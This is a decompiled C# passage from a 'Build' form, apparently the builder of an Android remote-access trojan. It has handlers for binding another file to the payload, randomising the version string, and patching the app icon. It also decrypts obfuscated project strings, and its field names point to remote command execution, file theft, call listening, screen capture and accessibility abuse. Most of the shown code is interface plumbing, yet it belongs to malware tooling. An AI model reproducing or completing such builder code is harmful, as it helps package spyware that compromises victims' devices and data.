				this.CheckDraw.Checked = true;
				this.CheckDraw.Refresh();
			}
		}

		// Token: 0x060009FE RID: 2558 RVA: 0x0006F60C File Offset: 0x0006D80C
		private void randomverbtn_Click(object sender, EventArgs e)
		{
			if (this.random_2 == null)
			{
				this.random_2 = new Random();
			}
			this.TextVersion.Text = string.Concat(new string[]
			{
				this.random_2.Next(1, 99).ToString(),
				".",
				this.random_2.Next(1, 99).ToString(),
				".",
				this.random_2.Next(1, 99).ToString(),
				".",
				this.random_2.Next(1, 99).ToString()
			});
		}

		// Token: 0x060009FF RID: 2559 RVA: 0x0000246D File Offset: 0x0000066D
		private void CheckQuick_MouseClick_1(object sender, MouseEventArgs e)
		{
		}

		// Token: 0x06000A00 RID: 2560 RVA: 0x0006F6C4 File Offset: 0x0006D8C4
		private void method_75(object sender, PaintEventArgs e)
		{
			e.Graphics.SmoothingMode = SmoothingMode.AntiAlias;
			Color white = Module5.White;
			if (this.rectangles_2.Count > 0)
			{
				try
				{
					foreach (Rectangle rect in this.rectangles_2)
					{
						if (rect.Width > 0)
						{
							e.Graphics.FillRectangle(new SolidBrush(white), rect);
						}
					}
				}
				finally
				{
					List<Rectangle>.Enumerator enumerator;
					((IDisposable)enumerator).Dispose();
				}
			}
		}

		// Token: 0x06000A01 RID: 2561 RVA: 0x0000246D File Offset: 0x0000066D
		private void method_76(object sender, MouseEventArgs e)
		{
		}

		// Token: 0x06000A02 RID: 2562 RVA: 0x0006F754 File Offset: 0x0006D954
		private void method_77(object sender, MouseEventArgs e)
		{
			this.startTime.Enabled = true;
		}

		// Token: 0x06000A03 RID: 2563 RVA: 0x0006F770 File Offset: 0x0006D970
		private void startTime_Tick(object sender, EventArgs e)
		{
			this.gcontrol0_0.ToolTip.RemoveAll();
			if (!this.gcontrol0_0.ToolTip.Active)
			{
				this.gcontrol0_0.ToolTip.Active = true;
			}
			this.startTime.Enabled = false;
		}

		// Token: 0x06000A04 RID: 2564 RVA: 0x0000246D File Offset: 0x0000066D
		private void method_79(object sender, EventArgs e)
		{
		}

		// Token: 0x06000A05 RID: 2565 RVA: 0x0006F7C0 File Offset: 0x0006D9C0
		private void CheckBIND_MouseClick(object sender, EventArgs e)
		{
			if (!this.bool_3)
			{
				if (this.CheckBIND.Checked)
				{
					this.FilePathApk.Title = "Select File";
					this.FilePathApk.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
					this.FilePathApk.Filter = "All Files|*.*";
					this.FilePathApk.FileName = string.Empty;
					if (this.FilePathApk.ShowDialog() == DialogResult.OK)
					{
						string fileName = this.FilePathApk.FileName;
						if (!File.Exists(fileName))
						{
							return;
						}
						try
						{
							this.string_1 = fileName;
							FileInfo fileInfo = new FileInfo(this.string_1);
							this.string_2 = fileInfo.Extension.Remove(0, 1);
							return;
						}
						catch (Exception ex)
						{
							this.string_1 = "null";
							this.string_2 = "null";
							this.CheckBIND.Checked = false;
							return;
						}
					}
				}
				this.string_1 = "null";
				this.string_2 = "null";
				this.CheckBIND.Checked = false;
			}
		}

		// Token: 0x06000A06 RID: 2566 RVA: 0x0006F8D8 File Offset: 0x0006DAD8
		internal string method_81()
		{
			try
			{
				XmlDocument xmlDocument = new XmlDocument();
				try
				{
					xmlDocument.LoadXml(File.ReadAllText(Application.StartupPath + "\\" + Module2.smethod_58("8mq82Mp958SsUo4WB4nn6Q==", "Project")));
				}
				catch (Exception ex)
				{
				}
				string value;
				if (Operators.CompareString(xmlDocument.DocumentElement.Name, Module2.smethod_58("7YJYs8nIczW6UcZhgdEyXw==", "Class"), false) == 0)
				{
					XmlElement xmlElement = xmlDocument.FirstChild["P3"];
					value = xmlElement.FirstChild.Value;
				}
				return Module2.smethod_41(Module2.smethod_58(value, "xmldata"));
			}
			catch (Exception ex2)
			{
			}
			GClass0 gclass = new GClass0();
			return gclass.method_2("C");
		}

		// Token: 0x06000A07 RID: 2567 RVA: 0x0006F9BC File Offset: 0x0006DBBC
		private void CheckIconPatch_MouseClick(object sender, EventArgs e)
		{
			try
			{
				if (!this.bool_3)
				{
					if (this.CheckIconPatch.Checked)
					{
						OpenFileDialog openFileDialog = new OpenFileDialog();
						openFileDialog.InitialDirectory = "C:\\";
						openFileDialog.Title = "Selecte icon App (.png)";
						openFileDialog.Filter = "png Files|*.png";
						DialogResult dialogResult = openFileDialog.ShowDialog();
						if (dialogResult != DialogResult.OK)
						{
							this.PictureBox1.Image = null;
							this.string_8 = "null";
							this.CheckIconPatch.Checked = false;
						}
						else
						{
							this.string_8 = openFileDialog.FileName;
							this.PictureBox1.Image = Module2.smethod_38(Image.FromFile(openFileDialog.FileName), new Size(144, 144), false);
						}
					}
					else
					{
						this.PictureBox1.Image = null;
						this.string_8 = "null";
						this.CheckIconPatch.Checked = false;
					}
				}
			}
			catch (Exception ex)
			{
				Interaction.MsgBox(ex.Message, MsgBoxStyle.OkOnly, null);
			}
		}

		// Token: 0x06000A08 RID: 2568 RVA: 0x00005FA5 File Offset: 0x000041A5
		[CompilerGenerated]
		private void Process_Exited(object sender, EventArgs e)
		{
			this.method_34();
		}

		// Token: 0x06000A09 RID: 2569 RVA: 0x00005FAD File Offset: 0x000041AD
		[CompilerGenerated]
		private void method_83()
		{
			this.method_26();
		}

		// Token: 0x0400050A RID: 1290
		private bool bool_0;

		// Token: 0x0400050B RID: 1291
		private bool bool_1;

		// Token: 0x0400050C RID: 1292
		private bool bool_2;

		// Token: 0x0400050D RID: 1293
		private string string_0;

		// Token: 0x0400050E RID: 1294
		private string string_1;

		// Token: 0x0400050F RID: 1295
		private string string_2;

		// Token: 0x04000510 RID: 1296
		private string string_3;

		// Token: 0x04000511 RID: 1297
		private string string_4;

		// Token: 0x04000512 RID: 1298
		private string string_5;

		// Token: 0x04000513 RID: 1299
		private string string_6;

		// Token: 0x04000514 RID: 1300
		private string string_7;

		// Token: 0x04000515 RID: 1301
		private string string_8;

		// Token: 0x04000516 RID: 1302
		private string string_9;

		// Token: 0x04000517 RID: 1303
		private string string_10;

		// Token: 0x04000518 RID: 1304
		private string string_11;

		// Token: 0x04000519 RID: 1305
		private string string_12;

		// Token: 0x0400051A RID: 1306
		private string string_13;

		// Token: 0x0400051B RID: 1307
		private string string_14;

		// Token: 0x0400051C RID: 1308
		private string string_15;

		// Token: 0x0400051D RID: 1309
		private string string_16;

		// Token: 0x0400051E RID: 1310
		private string string_17;

		// Token: 0x0400051F RID: 1311
		private string string_18;

		// Token: 0x04000520 RID: 1312
		private string string_19;

		// Token: 0x04000521 RID: 1313
		private string string_20;

		// Token: 0x04000522 RID: 1314
		private string string_21;

		// Token: 0x04000523 RID: 1315
		private bool bool_3;

		// Token: 0x04000524 RID: 1316
		private string string_22;

		// Token: 0x04000525 RID: 1317
		private Color color_0;

		// Token: 0x04000526 RID: 1318
		private Color color_1;

		// Token: 0x04000527 RID: 1319
		private GControl0 gcontrol0_0;

		// Token: 0x04000528 RID: 1320
		private string string_23;

		// Token: 0x04000529 RID: 1321
		private string T;

		// Token: 0x0400052A RID: 1322
		private string string_24;

		// Token: 0x0400052B RID: 1323
		private string string_25;

		// Token: 0x0400052C RID: 1324
		private string string_26;

		// Token: 0x0400052D RID: 1325
		private string string_27;

		// Token: 0x0400052E RID: 1326
		private string string_28;

		// Token: 0x0400052F RID: 1327
		private string string_29;

		// Token: 0x04000530 RID: 1328
		private string string_30;

		// Token: 0x04000531 RID: 1329
		private string string_31;

		// Token: 0x04000532 RID: 1330
		private string string_32;

		// Token: 0x04000533 RID: 1331
		private string string_33;

		// Token: 0x04000534 RID: 1332
		private string string_34;

		// Token: 0x04000535 RID: 1333
		private int int_0;

		// Token: 0x04000536 RID: 1334
		private int int_1;

		// Token: 0x04000537 RID: 1335
		private Bitmap bitmap_0;

		// Token: 0x04000538 RID: 1336
		private int int_2;

		// Token: 0x04000539 RID: 1337
		private string string_35;

		// Token: 0x0400053A RID: 1338
		private string string_36;

		// Token: 0x0400053B RID: 1339
		private string string_37;

		// Token: 0x0400053C RID: 1340
		private string string_38;

		// Token: 0x0400053D RID: 1341
		private string string_39;

		// Token: 0x0400053E RID: 1342
		private string string_40;

		// Token: 0x0400053F RID: 1343
		private string string_41;

		// Token: 0x04000540 RID: 1344
		private object object_0;

		// Token: 0x04000541 RID: 1345
		private string string_42;

		// Token: 0x04000542 RID: 1346
		private string string_43;

		// Token: 0x04000543 RID: 1347
		private string string_44;

		// Token: 0x04000544 RID: 1348
		private string string_45;

		// Token: 0x04000545 RID: 1349
		private object object_1;

		// Token: 0x04000546 RID: 1350
		private string string_46;

		// Token: 0x04000547 RID: 1351
		private object object_2;

		// Token: 0x04000548 RID: 1352
		private int int_3;

		// Token: 0x04000549 RID: 1353
		private string package;

		// Token: 0x0400054A RID: 1354
		private string name;

		// Token: 0x0400054B RID: 1355
		private string activz;

		// Token: 0x0400054C RID: 1356
		private string brodatz;

		// Token: 0x0400054D RID: 1357
		private string servziz;

		// Token: 0x0400054E RID: 1358
		private string tolziz;

		// Token: 0x0400054F RID: 1359
		private string _ask_prim_;

		// Token: 0x04000550 RID: 1360
		private string _trns_g_;

		// Token: 0x04000551 RID: 1361
		private string _cap_sc_;

		// Token: 0x04000552 RID: 1362
		private string _access_ask_;

		// Token: 0x04000553 RID: 1363
		private string _scctrl_;

		// Token: 0x04000554 RID: 1364
		private string _news_g_;

		// Token: 0x04000555 RID: 1365
		private string _strt_view_;

		// Token: 0x04000556 RID: 1366
		private string _sc_fb_;

		// Token: 0x04000557 RID: 1367
		private string _ask_draw_;

		// Token: 0x04000558 RID: 1368
		private string _ask_battary_;

		// Token: 0x04000559 RID: 1369
		private string _engine_wrk_;

		// Token: 0x0400055A RID: 1370
		private string _skin_cls_;

		// Token: 0x0400055B RID: 1371
		private string _update_app_;

		// Token: 0x0400055C RID: 1372
		private string _callr_lsnr_;

		// Token: 0x0400055D RID: 1373
		private string _clss_loder_;

		// Token: 0x0400055E RID: 1374
		private string _excut_meth_;

		// Token: 0x0400055F RID: 1375
		private string _run_comnd_;

		// Token: 0x04000560 RID: 1376
		private string _get_me_fil_;

		// Token: 0x04000561 RID: 1377
		private string _srv_worker_;

		// Token: 0x04000562 RID: 1378
		private string QQ0;

		// Token: 0x04000563 RID: 1379
		private string QQ1;

		// Token: 0x04000564 RID: 1380
		private string QQ2;

		// Token: 0x04000565 RID: 1381
		private string QQ3;

		// Token: 0x04000566 RID: 1382
		private string QQ4;

		// Token: 0x04000567 RID: 1383
		private string QQ5;

		// Token: 0x04000568 RID: 1384
		private string QQ6;

		// Token: 0x04000569 RID: 1385
		private string QQ8;

		// Token: 0x0400056A RID: 1386
		private string QQ9;

		// Token: 0x0400056B RID: 1387
		private string QQ10;

		// Token: 0x0400056C RID: 1388
		private string QQ11;

		// Token: 0x0400056D RID: 1389
		private string QQ12;

		// Token: 0x0400056E RID: 1390
		private string QQ13;

		// Token: 0x0400056F RID: 1391
		private string QQ14;

		// Token: 0x04000570 RID: 1392
		private string payload;

		// Token: 0x04000571 RID: 1393
		private string string_47;

		// Token: 0x04000572 RID: 1394
		private string string_48;

		// Token: 0x04000573 RID: 1395
		private string string_49;

		// Token: 0x04000574 RID: 1396
		private string string_50;

		// Token: 0x04000575 RID: 1397
		private string string_51;

		// Token: 0x04000576 RID: 1398
		private string string_52;

		// Token: 0x04000577 RID: 1399
		private string str6;

		// Token: 0x04000578 RID: 1400
		private string str7;

		// Token: 0x04000579 RID: 1401
		private string str8;

		// Token: 0x0400057A RID: 1402
		private string str9;

		// Token: 0x0400057B RID: 1403
		private string str10;

		// Token: 0x0400057C RID: 1404
		private string str11;

		// Token: 0x0400057D RID: 1405
		private string str12;

		// Token: 0x0400057E RID: 1406
		private string app0;

		// Token: 0x0400057F RID: 1407
		private string ico0;

		// Token: 0x04000580 RID: 1408
		private string ico1;

		// Token: 0x04000581 RID: 1409
		private string web0;

		// Token: 0x04000582 RID: 1410
		private string noti8;

		// Token: 0x04000583 RID: 1411
		private string string_53;

		// Token: 0x04000584 RID: 1412
		private string string_54;

		// Token: 0x04000585 RID: 1413
		private string string_55;

		// Token: 0x04000586 RID: 1414
		private string string_56;

		// Token: 0x04000587 RID: 1415
		private string string_57;

		// Token: 0x04000588 RID: 1416
		private string string_58;

		// Token: 0x04000589 RID: 1417
		private string string_59;

		// Token: 0x0400058A RID: 1418
		private string string_60;

		// Token: 0x0400058B RID: 1419
		private string string_61;

		// Token: 0x0400058C RID: 1420
		private string string_62;

		// Token: 0x0400058D RID: 1421
		private string string_63;

		// Token: 0x0400058E RID: 1422
		private string string_64;

		// Token: 0x0400058F RID: 1423
		private string string_65;

		// Token: 0x04000590 RID: 1424
		private string string_66;

		// Token: 0x04000591 RID: 1425
		private string string_67;

		// Token: 0x04000592 RID: 1426
		private string string_68;

		// Token: 0x04000593 RID: 1427
		public Random random_0;

		// Token: 0x04000594 RID: 1428
		private string string_69;

		// Token: 0x04000595 RID: 1429
		public bool bool_4;

		// Token: 0x04000596 RID: 1430
		private bool bool_5;

		// Token: 0x04000597 RID: 1431
		private bool bool_6;

		// Token: 0x04000598 RID: 1432
		private bool bool_7;

		// Token: 0x04000599 RID: 1433
		public bool bool_8;

		// Token: 0x0400059A RID: 1434
		public bool bool_9;

		// Token: 0x0400059B RID: 1435
		public bool bool_10;

		// Token: 0x0400059C RID: 1436
		private bool bool_11;

		// Token: 0x0400059E RID: 1438
		private Process process_0;

		// Token: 0x0400059F RID: 1439
		private string[] strings_0;

		// Token: 0x040005A0 RID: 1440
		private Random random_1;

		// Token: 0x040005A1 RID: 1441
		private Random random_2;

		// Token: 0x040005A2 RID: 1442
		private List<Rectangle> rectangles_0;

		// Token: 0x040005A3 RID: 1443
		private List<Rectangle> rectangles_1;

		// Token: 0x040005A4 RID: 1444
		private List<Rectangle> rectangles_2;

		// Token: 0x040005A5 RID: 1445
		private Random random_3;

		// Token: 0x040005A6 RID: 1446
		private StaticLocalInitFlag staticLocalInitFlag_0;

		// Token: 0x040005A7 RID: 1447
		private Random random_4;

		// Token: 0x040005A8 RID: 1448
		private StaticLocalInitFlag staticLocalInitFlag_1;

		// Token: 0x020000A4 RID: 164
		// (Invoke) Token: 0x06000A0D RID: 2573
		public delegate void GDelegate15(object object_0, object object_1);

		// Token: 0x020000A5 RID: 165
		[CompilerGenerated]
		[Serializable]
		internal sealed class Class12
		{
			// Token: 0x06000A10 RID: 2576 RVA: 0x0006FAE4 File Offset: 0x0006DCE4
			internal void method_0()
			{
				do
				{
					try
					{
						if (!GClass9.bool_0)
						{
							GClass9.bool_0 = Module8.smethod_3();
						}
					}
					catch (Exception ex)
					{
					}
					Thread.Sleep(25000);
				}
				while (!GClass9.bool_0);
			}

			// Token: 0x040005A9 RID: 1449
			public static readonly Build.Class12 class12_0 = new Build.Class12();

			// Token: 0x040005AA RID: 1450
			public static ThreadStart threadStart_0;
		}
	}
}
